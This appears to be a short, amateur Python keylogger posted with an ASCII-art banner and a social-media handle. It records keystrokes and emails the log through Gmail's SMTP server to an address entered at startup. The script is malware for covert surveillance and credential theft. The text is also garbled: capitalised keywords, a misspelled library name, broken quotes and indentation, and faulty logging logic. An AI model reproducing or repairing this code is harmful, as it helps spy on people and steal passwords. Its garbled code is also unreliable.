Import getpass
Import smtplib 

From pynut.keyboard Key, Listener
Print(' ' ' 
  . . / \ / \  _ | | | __   __ \ // //  _/  |  | | /  \ / \ / _/  _  \ \ /\ /\ /| _\ \ |( <> ) // > // > /| | / _/\ / _ >_ >__ /_/_/_ /_ / _ >| / / / / /_/ ' ' ') 

# Set Up Email 

Email = input(' Enter Email: ')
Password = getpass.getpass(prompt='password: ", stream-None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)



# logger
Full_log = ' '
word = ' '
email_char_limit = 50
def on_press(key):
global word
global full_log
global email
global email_char_limit 

if key == Key.space or key == Key.enter:
word == ' '
full_log == ' '
word = ' '
If len(full_log) >= email_char_limit:
send_log()
full_log = ' '
elif key == Key.shift_1 or key.shift_r:
Return
elif key == Key.backspace:
word = word[:-1]
else:
char = f'(key)'
char = char[1:-1]
word += char 


if key == Key.esc:
return false



send_log():
server.sendmail(
email,
email,
full_log
) 

with listener( on_press=on_press ) as listener:
listener.joint()

Message @weebgangonft